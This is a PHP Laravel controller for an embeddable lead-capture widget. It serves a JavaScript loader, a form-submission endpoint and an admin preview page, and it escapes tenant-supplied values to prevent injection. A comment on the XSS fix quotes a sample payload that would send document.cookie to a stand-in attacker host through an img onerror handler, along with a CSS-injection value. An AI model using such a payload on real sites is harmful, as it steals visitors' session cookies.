<?php

namespace App\Http\Controllers;

use App\Models\Lead;
use App\Models\LeadCaptureWidget;
use App\Services\LeadIngestionService;
use Illuminate\Http\Request;
use Illuminate\Http\Response;

class PublicWidgetController extends Controller
{
    public function loader(Request $request, string $uuid): Response
    {
        // withoutGlobalScope('tenant') is REQUIRED here.  This is a
        // public, unauthenticated route embedded on external customer
        // sites — there is no resolved tenant and no logged-in user, so
        // the BelongsToTenant global scope fails CLOSED (injects
        // `0 = 1`) and the lookup would ALWAYS return null → the embed
        // script 404s → no floating button, empty panel.  The random
        // UUID is the unguessable access key (same model preview() and
        // TrackingController already rely on).
        //
        // ?preview=1 (used by preview())  bypasses the is_active filter
        // so a draft / toggled-off widget still renders inside the
        // admin preview page — without this, previewing an inactive
        // widget showed an empty chat box.
        $isPreview = $request->boolean('preview');
        $query = LeadCaptureWidget::withoutGlobalScope('tenant')->where('uuid', $uuid);
        if (! $isPreview) {
            $query->where('is_active', true);
        }
        $widget = $query->first();
        if (!$widget) {
            return response('/* widget not found */', 404, ['Content-Type' => 'application/javascript']);
        }

        $submitUrl    = url('/widget/' . $uuid . '/submit');

        // The widget UUID is interpolated below into a JS *identifier*
        // (window.__LeadHubWidget_<id>) used as a double-include guard.
        // UUIDs contain hyphens, which are illegal in a JS identifier and
        // make digit groups like "4e2b" tokenize as a malformed
        // number-then-identifier ("Invalid or unexpected token"), breaking
        // the entire snippet so the widget never renders.  Strip the
        // hyphens so the key stays a valid, per-widget-unique identifier.
        $jsKey = str_replace('-', '', $uuid);

        // Critical XSS fix:
        // The widget loader emits a JS file that does
        //   panel.innerHTML = '<h2>{$headline}</h2>' + ...
        // The prior implementation used addslashes() on tenant-supplied
        // values (headline, subheadline, button_text, success_message).
        // addslashes() escapes ONLY \ ' " NUL — NOT HTML chars.  A tenant
        // who saves
        //   headline = "</h2><img src=x onerror=fetch('//evil/?'+document.cookie)>"
        // contains no quotes/slashes, so addslashes is a no-op.  When
        // .innerHTML is set, the browser parses the resulting string as
        // HTML, the <img> tag is constructed, onerror fires → XSS that
        // runs on EVERY customer site that embeds this tenant's widget.
        // SaaS-to-customer-origin sandbox escape — worst-case
        // finding.
        //
        // Fix: HTML-escape via e().  e() escapes <>'"& as entities.
        // Inside a single-quoted JS string literal, &#039; survives
        // (entity in JS string, not a closing quote).  When .innerHTML
        // is set, the browser entity-decodes &#039; back to ' but the
        // surrounding context is TEXT (not a tag attribute), so the
        // apostrophe is rendered as literal text.  And &lt; / &gt; in
        // innerHTML are rendered as literal "<" / ">" text, NOT parsed
        // as tag start/end.
        //
        // Colors land in CSS context ('background:'+PRIMARY+...) — use
        // ColorSafety::safeHex which enforces /^#[0-9a-f]{3,8}$/i so a
        // tenant saving primary_color = "red; }; body{display:none}"
        // falls back to default instead of injecting CSS.
        // Position is a match() whitelist below — already safe.

        $primaryColor = \App\Support\ColorSafety::safeHex($widget->primary_color ?? null, '#3b82f6');
        $textColor    = \App\Support\ColorSafety::safeHex($widget->text_color    ?? null, '#ffffff');
        $position     = is_string($widget->position) ? $widget->position : 'bottom-right';
        $headline     = e($widget->headline      ?? __('public_widget.default_headline'));
        $subheadline  = e($widget->subheadline   ?? '');
        $buttonText   = e($widget->button_text   ?? __('public_widget.default_button_label'));
        $successMsg   = e($widget->success_message ?? __('public_widget.default_success_message'));
        $showPhone    = $widget->show_phone    ? 'true' : 'false';
        $showCompany  = $widget->show_company  ? 'true' : 'false';
        $showMessage  = $widget->show_message  ? 'true' : 'false';
        $requirePhone = $widget->require_phone ? 'true' : 'false';

        // Translator-managed strings land in HTML attribute context
        // (placeholder="...") inside JS string literals.  Same e() rule
        // applies: HTML-escape so JS string survives + innerHTML decode
        // renders attribute values safely.
        $lblFirstName = e(__('public_widget.field_first_name'));
        $lblEmail     = e(__('public_widget.field_email'));
        $lblPhone     = e(__('public_widget.field_phone'));
        $lblCompany   = e(__('public_widget.field_company'));
        $lblMessage   = e(__('public_widget.field_message'));
        $lblTryAgain  = e(__('public_widget.try_again'));

        $positionCss = match ($position) {
            'bottom-left'  => 'bottom:24px;left:24px;',
            'top-right'    => 'top:24px;right:24px;',
            'top-left'     => 'top:24px;left:24px;',
            default        => 'bottom:24px;right:24px;',
        };

        $js = <<<JS
(function() {
  if (window.__LeadHubWidget_{$jsKey}) return;
  window.__LeadHubWidget_{$jsKey} = true;

  var PRIMARY = '{$primaryColor}';
  var TEXT    = '{$textColor}';
  var SUBMIT  = '{$submitUrl}';

  var style = document.createElement('style');
  style.textContent = [
    '.lhw-btn{position:fixed;{$positionCss}z-index:99999;background:'+PRIMARY+';color:'+TEXT+';border:none;border-radius:50%;width:56px;height:56px;font-size:24px;cursor:pointer;box-shadow:0 4px 12px rgba(0,0,0,.2);display:flex;align-items:center;justify-content:center;}',
    '.lhw-panel{position:fixed;{$positionCss}z-index:99998;background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.18);width:320px;padding:24px;display:none;font-family:system-ui,sans-serif;}',
    '.lhw-panel h2{margin:0 0 4px;font-size:1.1rem;color:#111;}',
    '.lhw-panel p{margin:0 0 16px;font-size:.85rem;color:#555;}',
    '.lhw-panel input,.lhw-panel textarea{width:100%;box-sizing:border-box;border:1px solid #d1d5db;border-radius:6px;padding:8px 10px;font-size:.875rem;margin-bottom:10px;outline:none;}',
    '.lhw-panel textarea{resize:vertical;min-height:70px;}',
    '.lhw-submit{width:100%;background:'+PRIMARY+';color:'+TEXT+';border:none;border-radius:6px;padding:10px;font-size:.9rem;cursor:pointer;font-weight:600;}',
    '.lhw-submit:disabled{opacity:.6;cursor:not-allowed;}',
    '.lhw-success{text-align:center;color:#16a34a;font-weight:600;font-size:.95rem;padding:12px 0;}',
  ].join('');
  document.head.appendChild(style);

  var btn   = document.createElement('button');
  btn.className = 'lhw-btn';
  btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="22" height="22"><path d="M4.913 2.658c2.075-.27 4.19-.408 6.337-.408 2.147 0 4.262.139 6.337.408 1.922.25 3.291 1.861 3.405 3.727a4.403 4.403 0 0 0-1.032-.211 50.89 50.89 0 0 0-8.42 0c-2.358.196-4.04 2.19-4.04 4.434v4.286a4.47 4.47 0 0 0 2.433 3.984L7.28 21.53A.75.75 0 0 1 6 21v-4.03a48.527 48.527 0 0 1-1.087-.128C2.905 16.58 1.5 14.833 1.5 12.862V6.638c0-1.97 1.405-3.718 3.413-3.979Z"/><path d="M15.75 7.5c-1.376 0-2.739.057-4.086.169C10.124 7.797 9 9.103 9 10.609v4.285c0 1.507 1.128 2.814 2.67 2.94 1.243.102 2.5.157 3.768.165l2.782 2.781a.75.75 0 0 0 1.28-.53v-2.39l.33-.026c1.542-.125 2.67-1.433 2.67-2.94v-4.286c0-1.505-1.124-2.811-2.664-2.94A49.392 49.392 0 0 0 15.75 7.5Z"/></svg>';
  document.body.appendChild(btn);

  var panel = document.createElement('div');
  panel.className = 'lhw-panel';
  panel.innerHTML = '<h2>{$headline}</h2>' +
    ('{$subheadline}' ? '<p>{$subheadline}</p>' : '') +
    '<form id="lhw-form">' +
    '<input type="text" name="first_name" placeholder="{$lblFirstName}" required>' +
    '<input type="email" name="email" placeholder="{$lblEmail}" required>' +
    ({$showPhone}  ? '<input type="tel" name="phone" placeholder="{$lblPhone}' + ({$requirePhone} ? ' *' : '') + '"' + ({$requirePhone} ? ' required' : '') + '>' : '') +
    ({$showCompany} ? '<input type="text" name="company" placeholder="{$lblCompany}">' : '') +
    ({$showMessage} ? '<textarea name="message" placeholder="{$lblMessage}"></textarea>' : '') +
    '<button type="submit" class="lhw-submit">{$buttonText}</button>' +
    '</form>' +
    '<div class="lhw-success" style="display:none">{$successMsg}</div>';
  document.body.appendChild(panel);

  btn.addEventListener('click', function() {
    panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
  });

  panel.querySelector('#lhw-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var submit = panel.querySelector('.lhw-submit');
    submit.disabled = true;
    var fd = new FormData(e.target);
    var data = {};
    fd.forEach(function(v,k){ data[k]=v; });
    fetch(SUBMIT, {
      method: 'POST',
      headers: {'Content-Type':'application/json','Accept':'application/json'},
      body: JSON.stringify(data)
    }).then(function(r){
      panel.querySelector('#lhw-form').style.display='none';
      panel.querySelector('.lhw-success').style.display='block';
      setTimeout(function(){ panel.style.display='none'; }, 3000);
    }).catch(function(){
      submit.disabled=false;
      submit.textContent='{$lblTryAgain}';
    });
  });
})();
JS;

        return response($js, 200, [
            'Content-Type'                => 'application/javascript',
            'Cache-Control'               => 'public, max-age=300',
            'Access-Control-Allow-Origin' => '*',
        ]);
    }

    public function submit(Request $request, string $uuid)
    {
        // withoutGlobalScope('tenant') — same reason as loader():
        // public unauthenticated POST from an external site has no
        // tenant context, so the fail-closed global scope would 404
        // every submission.  The widget's tenant_id (read below to
        // scope the created lead) is the trusted tenant binding.
        $widget = LeadCaptureWidget::withoutGlobalScope('tenant')
            ->where('uuid', $uuid)
            ->where('is_active', true)
            ->first();
        if (!$widget) {
            return response()->json(['error' => __('messages.widget_not_found')], 404);
        }

        $validated = $request->validate([
            'first_name' => 'required|string|max:100',
            'email'      => 'required|email|max:200',
            'phone'      => 'nullable|string|max:30',
            'company'    => 'nullable|string|max:150',
            'message'    => 'nullable|string|max:2000',
        ]);

        try {
            $utm = array_filter([
                'utm_source'   => $request->input('utm_source',   $request->query('utm_source')),
                'utm_medium'   => $request->input('utm_medium',   $request->query('utm_medium')),
                'utm_campaign' => $request->input('utm_campaign', $request->query('utm_campaign')),
                'utm_content'  => $request->input('utm_content',  $request->query('utm_content')),
                'utm_term'     => $request->input('utm_term',     $request->query('utm_term')),
                'landing_page' => $request->input('landing_page'),
                'referrer_url' => $request->input('referrer_url', $request->header('Referer')),
            ], fn($v) => $v !== null && $v !== '');

            $leadData = array_merge($validated, $utm, [
                'source'             => 'web_form',
                'pipeline_id'        => $widget->pipeline_id,
                'pipeline_stage_id'  => $widget->pipeline_stage_id,
                'raw_data'           => array_merge($validated, ['widget_uuid' => $uuid], $utm),
            ]);

            $service = app(LeadIngestionService::class);
            $service->ingest($widget->tenant_id, $leadData);

            $widget->increment('leads_captured');

            return response()->json(['success' => true]);
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::warning('PublicWidgetController: submit failed', [
                'uuid'  => $uuid,
                'error' => $e->getMessage(),
            ]);
            return response()->json(['error' => __('messages.widget_submission_failed')], 500);
        }
    }

    /**
     * Public preview page for a widget — renders a mock "customer site"
     * with the widget loader embedded so admins can verify colours,
     * copy, position, and submit flow before deploying to production.
     * Inactive widgets preview here too (unlike the live loader) so
     * draft tweaks are visible.
     */
    public function preview(string $uuid)
    {
        $widget = LeadCaptureWidget::withoutGlobalScope('tenant')
            ->where('uuid', $uuid)
            ->first();

        if (! $widget) {
            abort(404);
        }

        // Force-enable the widget in the preview loader even if the
        // admin has it toggled off (so they can preview drafts).
        $loaderUrl   = url('/widget/' . $uuid . '/loader.js?preview=1');
        $widgetTitle = e($widget->headline ?: __('public_widget.preview_title'));

        $locale         = e(app()->getLocale());
        $previewSuffix  = e(__('public_widget.preview_suffix'));
        $banner         = e(__('public_widget.preview_banner'));
        $mockH1         = e(__('public_widget.preview_mock_h1'));
        $mockIntro      = e(__('public_widget.preview_mock_intro'));
        $howHeading     = e(__('public_widget.preview_how_heading'));
        // NOTE: paragraph contains a deliberate inline <strong> tag, so
        // it is rendered raw rather than HTML-escaped. The string is
        // translator-controlled (not user input), so this is safe.
        $howParagraph   = __('public_widget.preview_how_paragraph_html');
        $mainPlaceholder = e(__('public_widget.preview_main_content_placeholder'));
        $settingsHeading = e(__('public_widget.preview_settings_heading'));
        $lblPosition     = e(__('public_widget.preview_setting_position'));
        $lblPrimary      = e(__('public_widget.preview_setting_primary_colour'));
        $lblActive       = e(__('public_widget.preview_setting_active'));

        $position     = e($widget->position);
        $primaryColor = e($widget->primary_color);
        $activeLabel  = e($this->yesNo($widget->is_active));

        return response(<<<HTML
<!doctype html>
<html lang="{$locale}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{$widgetTitle}{$previewSuffix}</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:#111827;background:#f9fafb;line-height:1.55}
  .hero{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;padding:80px 24px;text-align:center}
  .hero h1{margin:0 0 12px;font-size:2.25rem;font-weight:800;letter-spacing:-.01em}
  .hero p{margin:0;opacity:.9;font-size:1.125rem}
  .banner{background:#fef3c7;border-bottom:1px solid #fcd34d;color:#92400e;padding:12px 24px;text-align:center;font-size:.875rem;font-weight:600}
  .content{max-width:720px;margin:0 auto;padding:40px 24px}
  .content h2{font-size:1.5rem;margin:24px 0 8px}
  .content p{color:#4b5563;margin:0 0 16px}
  .content .placeholder{background:#fff;border:2px dashed #e5e7eb;padding:40px 20px;text-align:center;border-radius:12px;color:#9ca3af;margin:24px 0}
</style>
</head>
<body>
  <div class="banner">{$banner}</div>
  <div class="hero">
    <h1>{$mockH1}</h1>
    <p>{$mockIntro}</p>
  </div>
  <div class="content">
    <h2>{$howHeading}</h2>
    <p>{$howParagraph}</p>
    <div class="placeholder">{$mainPlaceholder}</div>
    <h2>{$settingsHeading}</h2>
    <p>{$lblPosition} <code>{$position}</code> · {$lblPrimary} <code>{$primaryColor}</code> · {$lblActive} <strong>{$activeLabel}</strong></p>
  </div>
  <script src="{$loaderUrl}" defer></script>
</body>
</html>
HTML, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    private function yesNo(bool $v): string
    {
        return $v
            ? __('public_widget.preview_active_yes')
            : __('public_widget.preview_active_no');
    }
}
